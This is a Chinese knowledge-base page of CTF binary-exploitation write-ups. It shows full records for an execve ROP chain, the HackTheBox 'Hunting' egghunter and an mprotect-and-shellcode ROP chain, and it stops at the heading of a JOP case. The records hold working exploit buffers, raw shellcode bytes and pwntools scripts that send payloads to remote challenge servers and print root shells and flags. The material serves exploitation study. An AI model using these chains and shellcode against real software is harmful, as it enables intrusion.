---
title: ROP、SROP、JOP 与系统调用
date: '2026-11-25 12:00:00'
updated: '2026-11-25 12:00:00'
lang: zh-CN
permalink: knowledge/rop/
categories:
- 二进制安全
- 代码复用
tags:
- 知识库
- ROP
- 系统调用
- mprotect
- x86
- Egghunter
- Shellcode
- NX
- JOP
- 代码复用
- ret2libc
- ASLR
- SROP
description: 本章按原解法比较返回地址链、信号帧和调度表对寄存器的控制方式。执行页权限、输入分段、栈位置和 libc 版本都属于复现条件，最终脚本之前的推导一并保留。
knowledge: true
copyright: true
toc:
  enable: true
  number: false
  max_depth: 2
---

本章按原解法比较返回地址链、信号帧和调度表对寄存器的控制方式。执行页权限、输入分段、栈位置和 libc 版本都属于复现条件，最终脚本之前的推导一并保留。

<nav class="kb-tools" aria-label="章节操作">
<a href="/knowledge/">知识库目录</a>
<a href="/guide/">研究导读</a>
<a href="/knowledge/rop/source.md" download>下载 Markdown</a>
<button type="button" data-expand-evidence>展开全部技术记录</button>
</nav>

<!--more-->

## 分析重点

execve 与 mprotect 两篇实验保留可写区选择、页对齐和 read 输入的先后关系。

Sick ROP 利用 read 返回值设置 RAX，No Return 则围绕 dispatcher 组织 JOP。

Restaurant 的二阶段地址泄漏与 Hunting 的页面访问检查保留原始收发及异常处理。

## 案例与技术索引

| 分析入口 | 实验来源 | 技术点 |
| --- | --- | --- |
| [基于 int 0x80 的 execve 调用](#case-bin-sh-via-syscall) | bin-sh-via-syscall | ROP、x86、系统调用 |
| [内存页可达性与 Egghunter](#case-hunting) | hunting | Egghunter、Shellcode、系统调用 |
| [页权限与分段输入](#case-mprotect-and-shellcode) | mprotect-and-shellcode | ROP、mprotect、NX |
| [无 ret 条件下的 JOP 调度表](#case-noreturn) | noreturn | JOP、代码复用、系统调用 |
| [两阶段 ret2libc 与接收时序](#case-pwn-restaurant) | pwn-restaurant | ROP、ret2libc、ASLR |
| [read 返回值与 sigreturn frame](#case-sick-rop) | sick-rop | SROP、mprotect、ROP |

<a id="case-bin-sh-via-syscall"></a>

## 基于 int 0x80 的 execve 调用

先确定可写内存，再逐步写入字符串和指针，设置 EAX、EBX、ECX、EDX 并触发系统调用。每一段 gadget 的寄存器副作用均可回看。

<p class="kb-provenance">来源 bin-sh-via-syscall · 原记录 2021-09-14 · 15 个代码块 · 1 处图片引用</p>

<details class="kb-evidence" id="record-bin-sh-via-syscall">
<summary>查看分析过程、攻击步骤与完整代码</summary>

<!-- kb:start bin-sh-via-syscall -->

为了用sys_execve syscall执行/bin/sh，需要解决一些障碍，根据参考，需要设置寄存器如下;

EAX = 11 (or 0x0B in hex) – The execve syscall number
EBX = Address in memory of the string "/bin/sh"
ECX = Address of a pointer to the string "/bin/sh"
EDX = Null (可选的指向描述环境的结构的指针)

一旦所有这些都设置好了，执行int 0x80指令应该会生成一个shell。



#### 后面的工作

从想要的开始, 一次性链接一起解决问题, 直到已经完成了利用链, ROP exploitation的本质是解决一个问题常常引入另一个, 所以它重要, 集中和逻辑, 总是寻找不同的路线和替代解决方案。

首先需要的是放置/bin/sh字符串的地方，还需要一种方法将这个字符串写入这个选择的位置，以及一个包含指向这个位置的指针的内存地址。还需要能够向EDX写入空值(这通常是有问题的)，并向EAX、EBX和ECX写入任意值。最后，需要一个int 0x80指令。

#### Gadgets

可以用gadget的二进制, gadget是一个有用的ret指令, ret指令是至关重要的, 因为这是允许链接多个gadgets连接到一个链, 然后执行流, 返回从一个指令。如果exploit是一条链那么每个gadget都是链中的一环。

有许多工具可以简化寻找gadget和构建ROP链的过程，但暂时不考虑这些工具，而是自己动手，以确保对整个过程有一个很好的理解。

虽然正在看的二进制文件相当小，但它包含了很多gadgets，包括一个可疑的密集指令区域，看起来就像是故意构建的。

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/bin-sh-via-syscall.jpg)

这部分内存包含了需要的所有东西------从将数据从堆栈中弹出到EAX、EBX、ECX和EDX的gadget开始。如果控制了堆栈，那么就可以设置这些寄存器的值。

例如，从0x08048225开始的指令是pop %eax; ret，这个gadget获取堆栈顶部的任意4个字节，并将它们放入EAX寄存器，对堆栈指针加1，然后返回到下一个地址。为了使用它，将以下内容放入链中;

``` bash
[0x08048225][<Value to put into EAX>][<Next Gadget>] ...
```

还有gadget xor %edx,%edx; ret — 如果不能在漏洞中发送空字节，这将非常方便，因为已经知道需要将EDX设置为0。对寄存器自身进行0. XORing是使其归零的常用方法。

接下来，就得到了一个真正强大的工具 - 在0x0804822F的gadget是 mov %eax, (%edx); ret 将获取EAX中的任何内容，并将其复制到EDX中的地址所在的内存位置，因为可以将其与前面的gadget链接起来，以控制EAX和EDX的值，这就形成了write-what-where原语。

最后，可以在0x8048210找到一个int 0x80; ret gadget

#### 可写内存

着手将想要执行的命令的字符串写进程序的内存中。可以通过 objdump -x 找到一个合适的可写内存部分

``` bash
4 .bss 0000001c 0804a000 0804a000 00001000 2**2
ALLOC
```

值得注意的是，这个内存位置在最不重要的位置包含一个空字节，如果需要，可以添加一个小偏移量来避免这种情况，比如0x0804A004

#### Exploit

这是大量的[准备工作](https://failingsilently.wordpress.com/2017/12/14/bin-sh-rop-exploit/)，现在可以开始编写exploit了。正如在开始时提到的，为了获得最大的可读性，布局代码非常重要，所以要做的第一件事是为所有gadget提供可读的名称，并定义一个函数address()来进行小端地址转换。

``` bash
pop_eax = 0x08048225
pop_ebx = 0x08048227
pop_ecx = 0x08048229
pop_edx = 0x0804822B
zero_edx = 0x08048220
writewhatwhere = 0x0804822f
execute_syscall = 0x08048210
 
def address(data):
    return struct.pack("&lt;L", data)
```

还需要设置变量来保存可写内存地址，想放在那里的字符串，要放入64字节中的填充，最后是要覆盖EBP的垃圾值。因为这不会影响利用，它是一个小细节，但它有助于安排一切有条不紊。

``` bash
writable_memory=0x0804a010   # .bss section is writable
padding = " "                # we'll use spaces as padding
text = "A shell\n\n\n"       # Flavor text
EBPoverwrite = "AAAA"        # Bytes to overwrite EBP
```

知道在利用缓冲区中控制了68字节的EIP，因此可以用64字节 + 4字节构建缓冲区的第一部分来覆盖EBP

``` bash
buffer = text + padding * (64 - len(text))
buffer += EBPoverwrite
```

#### String Write 1

利用缓冲区中接下来的4个字节是设置EIP的第一个值，也是ROP链的开始。第一个任务是使用write-what-where函数将字符串 "/bin/sh" 放入内存，作为syscall的参数1，第一步是将要写入的值放入EAX。

``` bash
buffer += address(pop_eax) # place value into EAX
buffer += "/bin"           # 4 bytes at a time
```

当执行pop EAX gadget时，ESP将指向下一个4字节的字，即对应于ascii字符串 "/bin" 的字节。
下一步是使用pop edx gadget将想要写入的地址放入edx中

``` bash
buffer += address(pop_edx)         # place value into edx
buffer += address(writable_memory)
```

在这里使用address函数将字节重新排序为小的端序，因为两者都是内存地址。
最后，调用 mov %eax, (%edx) gadget来写内存

``` bash
buffer += address(writewhatwhere)
```

#### String Write 2

现在重复这个过程，将字符串的下一个4个字节写入内存。从技术上讲，只剩下3个字节可以写入，但可以稍微作弊一下，因为多个/字符会被execve忽略。写 "//sh" 需要更新EDX以添加 +4 偏移量，并更改EAX中的值。

``` bash
buffer += address(pop_eax)
buffer += "//sh"
buffer += address(pop_edx)
buffer += address(writable_memory + 4)
buffer += address(writewhatwhere)
```

字符串需要以空结束，在这里写入的内存被初始化为0，所以在这种情况下不需要担心，但它值得记住。

#### Address Write

现在需要的字符串在内存中，还需要向内存中写入指向它的指针。这是write-what-where原语的另一种用法。注意，写的偏移量是+12而不是+8，因为需要null结束字符串，不能把指针写在它旁边，需要有一个小的间隙。

``` bash
# write the address containing /bin/sh string into memory
buffer += address(pop_eax)
buffer += address(writable_memory)
buffer += address(pop_edx)
buffer += address(writable_memory + 12)
buffer += address(writewhatwhere)
```

#### Zero EDX

需要的第三个参数存储在EDX中，应该是0x00000000。可以使用pop_edx gadget将空值移动到寄存器中，在这种情况下，这很好，因为可以在exploit中写入空值。或者，可以使用 xor %edx, %edx gadget，这是一种更通用的方法，因为0x00经常是一个坏字符。现在已经完成了write-what-where的使用，不再需要它了，所以是时候将它归零了。

``` bash
buffer += address(zero_edx)
```

#### 设置寄存器

现在是为syscall准备EBX和ECX的时候了，这是很容易做到的，因为两者都是内存位置;

``` bash
buffer += address(pop_ebx)
buffer += address(writable_memory)          # location of string /bin/sh
 
buffer += address(pop_ecx)
buffer += address(writable_memory + 12)     # address of pointer to /bin/sh
```

最后一个参数是需要放入EAX中的syscall number。同样，0x0000000B包含空字节，这可能导致一些问题是利用。可能有必要(例如)将寄存器置零，并将其增加到11，以避免坏字符，或其他一些更迂回的设置寄存器的方法。

``` bash
buffer += address(pop_eax)
buffer += struct.pack("<I", 0x0000000B)
```

#### Execve Syscall

现在该执行执行syscall了。现在正确设置了call的所有参数，这非常简单。还在这里完成了exploit，打印正在构建的缓冲区的内容。

``` bash
buffer += address(execute_syscall)
print(buffer)
```

#### 运行exploit

在测试中，可以看到shell按照预期创建，但是当主机程序关闭时，它会立即关闭。这带来了一些问题，直到一个朋友指出，这是一个众所周知的常见问题，很容易通过使用cat保持输入管道打开来解决;

``` bash
root@kali:~# python exploit.py > exploit
root@kali:~# (cat exploit; cat) | ./binary_challenge
Show me what you’ve got
:>You’ve got: A shell
AAAA%�/bin+�
id
uid=0(root) gid=0(root) groups=0(root)
```

好了，一个适用于简单缓冲区溢出的ROP exploit。这是一个很有趣的挑战，在完成它的过程中学到了很多。希望本walkthrough对您的学习有用，并/或有趣。

#### 参考链接(译)

 - [A Simple ROP Exploit – /bin/sh via syscall](https://failingsilently.wordpress.com/2017/12/14/rop-chain-shell/)
<!-- kb:end bin-sh-via-syscall -->

</details>

<a id="case-hunting"></a>

## 内存页可达性与 Egghunter

目标随机放置字符串，原链用系统调用判断页面可访问性，避免逐页搜索时崩溃。两种实现及其空间限制均保留。

<p class="kb-provenance">来源 hunting · 原记录 2021-01-27 · 10 个代码块 · 13 处图片引用</p>

<details class="kb-evidence" id="record-hunting">
<summary>查看分析过程、攻击步骤与完整代码</summary>

<!-- kb:start hunting -->

#### 详细过程及exp - 1

与任何二进制利用挑战一样，首先在二进制文件上运行checksec，以查看启用了哪种保护。

``` bash
┌──(root💀kali)-[~/hackthebox/challenge/pwn/Hunting]
└─# file hunting 
hunting: ELF 32-bit LSB pie executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=2df7efc7d5a8a8e75a178f568bb114902c6955fd, for GNU/Linux 3.2.0, stripped
┌──(root💀kali)-[~/hackthebox/challenge/pwn/Hunting]
└─# checksec hunting
[*] '/root/hackthebox/challenge/pwn/Hunting/hunting'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      PIE enabled
    RWX:      Has RWX segments
```



发现NX是禁用的，这意味着可以直接执行堆栈的内容。此外，发现PIE是启用的，这意味着每次在新进程中生成二进制数据时，都会为该二进制数据选择一个新的基址。打开IDA中的二进制文件并分析它，以了解它的功能。

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/hunting.jpg)

main函数的开始(尽管没有命名)显示在上面的插图中。在上面的插图中，注意到sub_12E8函数生成一个随机地址整数，然后安装exit作为SIGALRM信号处理程序，并调度一个3秒的警报计时器。这实际上意味着进程将在3秒的生命周期后结束自己。

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/hunting1.jpg)

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/hunting2.jpg)

在main函数的后半部分，注意到应用程序在前面生成的随机地址处分配了一个内存页。随后，应用程序将flag字符串写入新分配的内存页，并使用null-bytes填充主二进制数据段中的原始字符串，从而有效地将其从主二进制内存页中清除。最后，应用程序从标准输入读取最多60个字节(0x3c)，并将接收到的缓冲区作为可执行的内存块，然后由应用程序调用该内存块。

为了在远程内存中定位flag字符串，需要遍历远程进程中的所有内存页，直到找到flag字符串。此外，必须实现访问检查，以避免访问未分配的内存，以确保应用程序不会崩溃。最后，在定位字符串之后, 希望将字符串的内容写入标准输出。根据二进制语句用C编写的这样一个实现程序应该如下所示。

``` bash
for (uint32_t address = 0; address < 0x7fffffff; address += 0x1000)
{
    for (int i = 0; i < 0x1000; i++)
    {
        if (access(address + i + 4) == EFAULT)
            break;
        
        if (*(uint32*)address == 'HTB{')
        {
            write(1, address, strlen(address));
            exit(0);
        }
    }
    address += 0x1000;
}
```

为了把上面的代码写成x86汇编shellcode，需要弄清楚如何构造访问和编写的syscalls。

``` bash
Name	 EAX	    EBX	        ECX	    EDX	
access	 0x21	  filename	    mode	 –	
write	 0x04	     fd	        buf	   count
```

因此，需要确保启动寄存器以表现上表中所示的所需变量。代表上述C实现的x86汇编shellcode，也称为egghunter，因此在下面的Python脚本中。

 - getflag.py

``` bash
from pwn import *

buf = '\xfc'                    # cld
buf += '\x31\xd2'               # xor edx,edx
buf += '\x31\xc9'               # xor ecx,ecx

# next_page:
buf += '\x66\x81\xca\xff\x0f'   # or dx,0xfff

# next_offset:
buf += '\x42'                   # inc edx
buf += '\x8d\x5a\x04'           # lea ebx,[edx+0x04]
buf += '\x6a\x21'               # push 0x21
buf += '\x58'                   # pop eax
buf += '\xcd\x80'               # int 0x80
buf += '\x3c\xf2'               # cmp al,0xf2
buf += '\x74\xee'               # je <next_page>
buf += '\xb8\x47\x54\x42\x7b'   # mov eax,0x7b425447
buf += '\x40'                   # inc eax
buf += '\x89\xd7'               # mov edi,edx
buf += '\xaf'                   # scasd
buf += '\x75\xe8'               # jne <next_offset>

# egg_found:
buf += '\x31\xc0'               # xor eax,eax
buf += '\xb9\xff\xff\x00\x00'   # mov ecx,0xffff
buf += '\xf2\xae'               # repnz scasb
buf += '\x29\xd7'               # sub edi,edx
buf += '\x89\xd1'               # mov ecx,edx
buf += '\x89\xfa'               # mov edx,edi
buf += '\x31\xdb'               # xor ebx,ebx
buf += '\x43'                   # inc ebx
buf += '\x6a\x04'               # push 0x4
buf += '\x58'                   # pop eax
buf += '\xcd\x80'               # int 0x80

s = remote('159.65.87.50', 32542)
s.send(buf)

print s.recvuntil('\x00')[:-1]
s.close()
```

注意，从"HTB{" 字符串的整数代表中减去1，并在随后的指令中对其加1。这样做是为了确保egghunter shellcode不会在定位自身时终止。

现在，可以运行脚本从远程系统获取flag字符串。

``` bash
┌──(root💀kali)-[~/hackthebox/challenge/pwn/Hunting]
└─# python getflag.py                                                                                                                    
[+] Opening connection to 178.128.161.75 on port 32045: Done
HTB{H0w_0n_34rth_d1d_y0u_f1nd_m3?!?}
[*] Closed connection to 178.128.161.75 port 32045
```

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/hunting3.jpg)

#### 详细过程及exp - 2
#### 1. Basic checks:

``` bash
┌──(root💀kali)-[~/hackthebox/challenge/pwn/Hunting]
└─# file hunting 
hunting: ELF 32-bit LSB pie executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=2df7efc7d5a8a8e75a178f568bb114902c6955fd, for GNU/Linux 3.2.0, stripped
┌──(root💀kali)-[~/hackthebox/challenge/pwn/Hunting]
└─# checksec hunting
[*] '/root/hackthebox/challenge/pwn/Hunting/hunting'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      PIE enabled
    RWX:      Has RWX segments
```

#### 2. General overview:

Since there is NX bit disabled, shellcode can be executed from the stack.

Run the binary using pwntools with attached GDB and send a unique 100B long string using [cyclic](https://docs.pwntools.com/en/stable/util/cyclic.html).

 - check.py

``` python
from pwn import *
import time

p = process("./hunting")
context.log_level = "debug"
gdb.attach(p,"c")

p.sendline(cyclic(100))
p.recv()

p.interactive()
```

Check the length of the value from EIP register.

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/hunting4.jpg)

First, 4 bytes were executed immediately, so there is a total of 60B of space available to store a shellcode.

#### 3. Disassemble binary and spot the foothold:

(1) First line of main() generate a random number between 0x5fffffff and 0xf7000000 using /dev/urandom that will be used as an address for flag copied via strcpy()

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/hunting5.jpg)

(2) Then [SIGALRM](https://linuxhint.com/sigalarm_alarm_c_language/) [signal](https://www-uxsup.csx.cam.ac.uk/courses/moved.Building/signals.pdf) is set to exit() after 3 seconds

A process can request a "wake up call" from the operating system at some time in the future by calling the alarm() function. When that time comes round the wake-up call consists of this signal.

(3) mmap() creates a new mapping in the virtual address space of the calling process. The starting address for the new mapping is specified in eax which was generated in (1) first-line by sub_12e8().

(4) strcpy() copy the flag to the (1)randomly generated and (3)mapped memory space.

(5) memset() sets the first num bytes of the block of memory pointed by ptr to the specified value - in this case, zeroes previous memory space which contains the flag value.

Then 60B is (6)allocated on the heap by malloc() and read from the user input(7).

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/hunting6.jpg)

The conclusion from the above analysis is that the flag is allocated somewhere in the process memory and starts with "HTB{" bytes.

In order to find it, you can use a technique called [egg hunting](https://pentesterslife.blog/2017/11/24/x64-egg-hunting-in-linux-systems/).

There are 60 bytes of total space for shellcode.

Egghunter got only 3 seconds to find the egg.

#### 4. Prepare the egg hunter:

To delay the exit() after 3 seconds, alarm syscall will be used.

To find the egg, [access](https://man7.org/linux/man-pages/man2/access.2.html) syscall will be used.

To display the flag [write](https://man7.org/linux/man-pages/man2/write.2.html) syscall will be used.

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/hunting7.jpg)

First, extend the time using alarm syscall.

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/hunting8.jpg)

Then find the "HTB{" egg using access syscall.

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/hunting9.jpg)

Finally, display the 24 bytes followed by the "HTB{" EGG to the STDOUT using write syscall.

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/hunting10.jpg)

Use the below script to assemble, link, and extract the opcodes.

``` bash
# compile_shellcodex86
function compile_shellcodex86 {
    nasm -f elf -o "$1.o" "$1.asm"
    ld -m elf_i386 -o "$1" "$1.o"
    objdump -d "$1"|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/\ $//g'|sed 's/\ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g' |tee -a "$1_extracted_shellcode"
    echo Length:`cat "$1_extracted_shellcode" | grep -o x | wc -l`
}
```

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/hunting11.jpg)

#### 5. Final exploit:

``` python
from pwn import *
context.arch = "i386"

#p = process("./hunting")
p = remote("139.59.166.56",32302)

p.sendline("\x6a\x1b\x58\x6a\x64\x5b\xcd\x80\xbb\x48\x54\x42\x7b\xba\xff\xff\xff\x5f\x31\xc9\xb0\x21\x66\x81\xca\xff\x0f\x42\x60\x8d\x5a\x04\xcd\x80\x3c\xf2\x61\x74\xef\x39\x1a\x75\xf0\x6a\x04\x58\x6a\x01\x5b\x89\xd1\x6a\x24\x5a\xcd\x80\xeb\xc6")
p.recv()
p.interactive()
```

``` bash
┌──(root💀kali)-[~/hackthebox/challenge/pwn/Hunting]
└─# python pwnexp.py 
[+] Opening connection to 188.166.173.208 on port 31589: Done
[*] Switching to interactive mode
HTB{H0w_0n_34rth_d1d_y0u_f1nd_m3?!?}HTB{H0w_0n_34rth_d1d_y0u_f1nd_m3?!?}HTB{H0w_0n_34rth_d1d_y0u_f1nd_m3?!?}HTB{H0w_0n_34rth_d1d_y0u_f1nd_m3?!?}HTB{H0w_0n_34rth_d1d_y0u_f1nd_m3?!?}HTB{H0w_0n_34rth_d1d_y0u_f1nd_m3?!?}HTB{H0w_0n_34rth_d1d_y0u_f1nd_m3?!?}HTB{H0w_0n_34rth_d1d_y0u_f1nd_m3?!?}HTB{H0w_0n_34rth_d1d_y0u_f1nd_m3?!?}HTB{H0w_0n_34rth_d1d_y0u_f1nd_m3?!?}HTB{H0w_0n_34rth_d1d_y0u_f1nd_m3?!?}HTB{H0w_0n_34rth_d1d_y0u_f1nd_m3?!?}HTB{H0w_0n_34rth_d1d_y0u_f1nd_m3?!?}HTB{H0w_0n_34rth_d1d_y0u_f1nd_m3?!?}HTB{H0w_0n_34rth_d1d_y0u_f1nd_m3?!?}HTB{H0w_0n_34rth_d1d_y0u_f1nd_m3?!?}HTB{H0w_0n_34rth_d1d_y0u_f1nd_m3?!?}HTB{H0w_0n_34rth_d1d_y0u_f1nd_m3?!?}HTB{H0w_0n_34rth_d1d_y0u_f1nd_m3?!?}HTB{H0w_0n_34rth_d1d_y0u_f1nd_m3?!?}HTB{H0w_0n_34rth_d1d_y0u_f1nd_m3?!?}HTB{H0w_0n_34rth_d1d_y0u_f1nd_m3?!?}HTB{H0w_0n_34rth_d1d_y0u_f1nd_m3?!?}HTB{H0w_0n_34rth_d1d_y0u_f1nd_m3?!?}HTB{H0w_0n_34rth_d1d_y0u_f1nd_m3?!?}HTB{H0w_0n_34rth_d1d_y0u_f1nd_m3?!?}HTB{H0w_0n_34rth_d1d_y0u_f1nd_m3?!?}HTB{H0w_0n_34rth_d1d_y0u_f1nd_m3?!?}HTB{H0w_0n_34rth_d1d_y0u_f1nd_m3?!?}HTB{H0w_0n_34rth_d1d_y0u_f1nd_m3?!?}HTB{H0w_0n_34rth_d1d_y0u_f1nd_m3?!?}HTB{H0w_0n_34rth_d1d_y0u_f1nd_m3?!?}HTB{H0w_0n_34rth_d1d_y0u_f1nd_m3?!?}HTB{H0w_0n_34rth_d1d_y0u_f1nd_m3?!?}HTB{H0w_0n_34rth_d1d_y0u_f1nd_m3?!?}HTB{H0w_0n_34rth_d1d_y0u_f1nd_m3?!?}HTB{H0w_0n_34rth_d1d_y0u_f1nd_m3?!?}HTB{H0w_0n_34rth_d1d_y0u_f1nd_m3?!?}HTB{H0w_0n_34rth_d1d_y0u_f1nd_m3?!?}HTB{H0w_0n_34rth_d1d_y0u_f1nd_m3?!?}HTB{H0w_0n_34rth_d1d_y0u_f1nd_m3?!?}HTB{H0w_0n_34rth_d1d_y0u_f1nd_m3?!?}HTB{H0w_0n_34rth_d1d_y0u_f1nd_m3?!?}HTB{H0w_0n_34rth_d1d_y0u_f1nd_m3?!?}HTB{H0w_0n_34rth_d1d_y0u_f1nd_m3?!?}HTB{H0w_0n_34rth_d1d_y0u_f1nd_m3?!?}HTB{H0w_0n_34rth_d1d_y0u_f1nd_m3?!?}HTB{H0w_0n_34rth_d1d_y0u_f1nd_m3?!?}HTB{H0w_0n_34rth_d1d_y0u_f1nd_m3?!?}HTB{H0w_0n_34rth_d1d_y0u_f1nd_m3?!?}HTB{H0w_0n_34rth_d1d_y0u_f1nd_m3?!?}HTB{H0w_0n_34rth_d1d_y0u_f1nd_m3?!?}HTB{H0w_0n_34rth_d1d_y0u_f1nd_m3?!?}HTB{H0w_0n_34rth_d1d_y0u_f1nd_m3?!?}HTB{H0w_0n_34rth_d1d_y0u_f1nd_m3?!?}HTB{H0w_0n_34rth_d1d_y0u_f1nd_m3?!?}HTB{H0w_0n_34rth_d1d_y0u_f1nd_m3?!?}HTB{H0w_0n_34rth_d1d_y0u_f1nd_m3?!?}HTB{H0w_0n_34rth_d1d_y0u_f1nd_m3?!?}$ 
[*] Interrupted
HTB{H0w_0n_34rth_d1d_y0u_f1nd_m3?!?}HTB{H0w_0n_34rth_d1d_y0u_f1nd_m3?!?}HTB{H0w_0n_34rth_d1d_y0u_f1nd_m3?!?}[*] Closed connection to 188.166.173.208 port 31589
```

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/hunting12.jpg)
<!-- kb:end hunting -->

</details>

<a id="case-mprotect-and-shellcode"></a>

## 页权限与分段输入

两种方法分别向栈和指定内存写入 shellcode，mprotect 的页对齐、read 的输入等待和 gadget 数量影响最终执行。

<p class="kb-provenance">来源 mprotect-and-shellcode · 原记录 2021-09-14 · 7 个代码块 · 1 处图片引用</p>

<details class="kb-evidence" id="record-mprotect-and-shellcode">
<summary>查看分析过程、攻击步骤与完整代码</summary>

<!-- kb:start mprotect-and-shellcode -->

基于上个ROP exploit建立的,学习编写ROP chains的另一种方法, 而不是[using sys_execve to spawn a shell](https://failingsilently.wordpress.com/2017/12/14/rop-chain-shell/), 用sys_mprotect关掉NX保护, 并执行shellcode。  



[Mprotect()](http://man7.org/linux/man-pages/man2/mprotect.2.html)是一个设置内存区域访问权限的函数，它有3个参数; 起始地址、长度和掩码，其中包含该内存区域的新权限。 需要注意的是，起始地址必须是内存页的开始。 可以从[源代码](http://unix.superglobalmegacorp.com/Net2/newsrc/sys/mman.h.html)中获取掩码的值。 可以通过syscall调用mprotect()，参数设置如下;

EAX - 0x7B – sys_mprotect syscall number
EBX - Address of Memory to change (必须与页面边界对齐)
ECX - Length of memory to change
EDX - Mask of new permissions (READ|WRITE|EXECUTE is 0x07)

接下来要考虑的事情是打算如何编写shellcode到选择的位置，有一些选项，可能会或可能不会工作，取决于你试图利用的环境;  

1. 将shellcode写入堆栈，使用mprotect()使堆栈可执行，并直接跳转到payload。
2. 使用mprotect()使内存区域可写和可执行，然后使用另一种技术在跳转到该位置之前将shellcode写入该位置。
3. 使用mprotect使一个内存区域可执行，并写入一个stagger，它可以跳转到另一个内存区域或从别处获取shellcode。

#### 方法一

在所使用的示例中，没有方便的gadeget来处理堆栈，理想情况下，希望使用JMP ESP gadget来处理在不同执行环境中移动的堆栈地址。事实上，必须使用硬编码的堆栈地址，可能会有少量的nop，虽然足够简单，但这似乎不是一个特别优雅的exploit。

为了获得堆栈内存页的地址和大小，使用gdb的info proc mappings命令;

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/mprotect-and-shellcode.jpg)

这是对现有exploit的修改，使用了许多相同的gadget，所以不打算翻新基本的exploit。 使用mprotect()在内存段上设置权限的部分ROP exploit如下所示;  

``` bash
buffer += address(pop_eax)         # place value into EAX
buffer += littleendian(0x0000007D) # MProtect syscall number
 
buffer += address(pop_ebx)         # place value into EBX
buffer += address(target_memory)   # 0xFFFDD000
 
buffer += address(pop_ecx)         # place value into ECX
buffer += littleendian(0x00021000) # Length of memory to change
 
buffer += address(pop_edx)
buffer += littleendian(0x00000007) # PROT_READ|PROT_WRITE|PROT_EXEC
 
buffer += address(execute_syscall)
```

如果将shellcode和最后一个gadget的最终返回地址一起推入堆栈中。 理想情况下，最后一个返回地址应该是一个jmp esp，但这里没有这个选项，所以将使用硬编码地址代替。

``` bash
### Stack based Approach ###
buffer += address(shellcode_location)  # 0xFFFFD494
buffer += NOPS * 100                   # 0x90
buffer += payload                      # shellcode
```

使用标准的/bin/sh shellcode进行测试;

``` bash
(gdb) run < exploit
Starting program: /root/binary_challenge < exploit Show me what you've got  :>You've got: XXXX%�}process 3077 is executing new program: /bin/dash
# id
uid=0(root) gid=0(root) groups=0(root
```

虽然它可以工作，但它依赖于硬编码的堆栈地址和NOP，所以并不是很好。

#### 方法二

可以使用另一个write原语将shellcode写入程序内存中的某个位置，而不是将shellcode写入堆栈。 已经在.bss部分中找到了一个很好的候选位置，因此可以将target_memory变量设置为堆内存的起始位置0x0804A000。 现在必须决定如何开始写。 最简单(也是最低效)的方法是使用从pop eax; pop edx; mov eax (edx)中构建的write-what-where原语gadget在我们的第一个[exploit](https://failingsilently.wordpress.com/2017/12/14/rop-chain-shell/)。

这不是写大量数据的好方法，它在DWORD中表现得很好，但它增加的写开销非常大，写50字节的shellcode需要超过200字节的payload。 可以使用syscall来创建一个新的任意写原语，而不是将大量数据写入单个缓冲区;

[read()](http://man7.org/linux/man-pages/man2/read.2.html)函数从文件描述符(fd)获取数据，并将一些字符写入指定的内存位置，其原型如下:

``` bash
read(int fd, void *buf, size_t count);
```

可以使用syscall number 0x03来调用read()函数，给它文件描述符0来从stdin获取值，并将现在可执行内存位置设置为目标，需要预先计算shellcode的长度，但这是很容易做到的。

``` bash
### Heap Based Approach ###
buffer += address(pop_eax)
buffer += littleendian(0x00000003) # sys_read syscall number
 
buffer += address(pop_ebx)         # first argument
buffer += littleendian(0x00000000) # stdin file descriptor
 
buffer += address(pop_ecx)         # second argument
buffer += address(target_memory)   # address to write to
 
buffer += address(pop_edx)         # third argument
buffer += littleendian(len(payload)) # length of payload
 
buffer += address(execute_syscall) # do the read()
```

最后，需要跳转到新的shellcode

``` bash
buffer += address(target_memory) # jump to the payload
print(buffer)
```

当调用这个新的exploit时，需要在exploit之后立即发送payload，以便它在stdin缓冲区中等待read()函数。 把payload放到了一个单独的文件里;  

``` bash
root@kali:~# (cat exploit; cat payload) | ./binary_challenge
Show me what you’ve got
:>You’ve got: XXXX%�}#
#
# id
uid=0(root) gid=0(root) groups=0(root)
# exit
```

如果在本地执行此操作，请记住将两个cat命令用大括号括起来，否则它们将一起运行，您的payload将在堆栈中而不是在输入缓冲区中结束。  

另一个浪费了几个小时时间的问题是，GDB不会更新内存段上的权限，所以如果认为mprotect失败了，要么检查strace中的返回值，要么在syscall返回时检查EAX寄存器。 0表示成功完成。 直到开始通过尝试执行NOPS进行测试，才意识到它表现得很好，尽管gdb说没有在堆段上设置执行权限。

#### 参考链接(译)

 - [ROP Exploit – MProtect() and Shellcode](https://failingsilently.wordpress.com/2017/12/17/rop-exploit-mprotect-and-shellcode/)
<!-- kb:end mprotect-and-shellcode -->

</details>

<a id="case-noreturn"></a>

## 无 ret 条件下的 JOP 调度表

原文从可泄漏栈的输入开始，寻找 dispatcher 与功能 gadget，逐步布置寄存器和调度表。最终脚本保留用于观察控制流的调试部分。

